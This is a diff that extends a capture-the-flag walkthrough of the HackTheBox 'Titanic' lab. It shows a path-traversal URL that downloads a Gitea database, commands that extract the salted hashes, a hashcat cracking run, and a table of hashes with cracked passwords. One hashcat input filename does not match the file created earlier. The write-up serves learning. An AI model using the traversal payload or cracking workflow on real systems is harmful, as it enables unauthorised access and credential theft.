@@ -239,4 +239,106 @@ Looks like we only have two users to target:
 - root
 - developer
 
-Also, we are starting to build a basic file structure for our target box. 
+Also, we are starting to build a basic file structure for our target box. Reviewing our notes, it looks like there should be a sql database for us to target.
+
+![](./.images/Screenshot-Titanic_Recon-5.png)
+
+![](./.images/Screenshot-Titanic_Initial-18.png)
+
+While there is some possible some useful information here, at our current junction, not so much.
+
+![](./.images/Screenshot-Titanic_Initial-19.png)
+
+Okay, that gives us a folder path to look for. Back to burp suite.
+
+![](./.images/Screenshot-Titanic_Initial-20.png)
+
+Believe it or not, the http status code of 500 tells us that we are on the right track. The folder exists but the script failed because it is not designed to download folders.
+
+![](./.images/Screenshot-Titanic_Initial-21.png)
+
+Win again, I have to admit, I got a little stuck at this point. So I looked up a walk though, [HTB Titanic Writeup | Step-by-Step Walkthrough | InfoSec Write-ups](https://infosecwriteups.com/hackthebox-titanic-writeup-5f549dd90f38?gi=5bca4b861560). All good though, we are all here to learn. Anyway, this person found that there we were so close, the database is a little bit further at gitea/gitea.db.
+
+![](./.images/Screenshot-Titanic_Initial-22.png)
+
+And so it is. To download it, head back to your browser of choice and put in our newly discovered url.
+
+```
+http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db
+```
+
+![](./.images/Screenshot-Titanic_Initial-23.png)
+
+![](./.images/Screenshot-Titanic_Initial-24.png)
+
+I am not a fan of the filename that the database got saved as, so I'm going to change it to something a little easier to work with.
+
+```
+mv ./_.._.._home_developer_gitea_data_gitea_gitea.db gitea.db
+```
+
+While I was able to dump the database myself, and I was able to find the passwords, I found myself lost again. Going back to the walk through, gitea saves the passwords as salted sh256 hashes. There is a tool to unsalt them and decrypt them using hashcat. 
+
+### Step 1. Extract the information in the correct format of hash|pass
+
+```
+sqlite3 gitea.db 'SELECT lower_name, passwd, salt FROM user;'>users1.txt
+```
+
+![](./.images/Screenshot-Titanic_Initial-25.png)
+
+Nice. We'll want this format for later to figure out which password belongs to who. Now are are going to remove the usernames from the hashes.
+
+```
+cat users1.txt|awk -F '|' '{print$2"|"$3}'>users1-preped.txt
+```
+
+![](./.images/Screenshot-Titanic_Initial-26.png)
+
+### Step 2. Download the tool and user it
+
+The tool comes from the [hashcat github](https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py) repo. So let's grab that.
+
+![](./.images/Screenshot-Titanic_Initial-27.png)
+
+Let's download this to the same directory where the database is to keep things easy. Then we can push our hash|pass file through it.
+
+```
+cat users1-preped.txt|python3 Tools/gitea2hashcat.py>users1-desalted.txt
+```
+
+![](./.images/Screenshot-Titanic_Initial-28.png)
+
+Okay, making progress.
+
+### Step 3. hashcat
+
+In the output file it says to run the file through hashcat using mode 10900. Fist I'm going to remove the unneeded text from the desalted file.
+
+```
+cat users1-desalted.txt|tail -3>users1-desalted1.txt
+```
+
+![](./.images/Screenshot-Titanic_Initial-29.png)
+
+Now for the hashcat
+
+```
+hashcat -m 10900 users1-decoded1.txt /usr/share/wordlists/rockyou.txt
+```
+
+![](./.images/Screenshot-Titanic_Initial-30.png)
+
+Working backwards, the database had three users in it:
+- administrator
+- developer
+- username
+
+Lining the hashes up looks kind of like:
+
+|     User    |User1.txt hash|users1-desalted.txt hash|password|
+|:-----------:|:------------:|:----------------------:|:------:|
+|administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136\|2d149e5fbd1b20cf31db3e3c6a28fc9b|LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=| |
+|  developer  |e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56\|8bf3e3452b78544f8bee9400d6936d34|i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=|25282528|
+|   username  |f705318c9983a02e5bc35b9ad752318022e1447a7429c5b7eb7c1fc0fc7300e769f6e21fe1ab23c61c52212ed595334012dd\|9b4ed59164c98d94917baa2916b54964|m07VkWTJjZSRe6opFrVJZA==:9wUxjJmDoC5bw1ua11IxgCLhRHp0KcW363wfwPxzAOdp9uIf4asjxhxSIS7VlTNAEt0=|password|
+
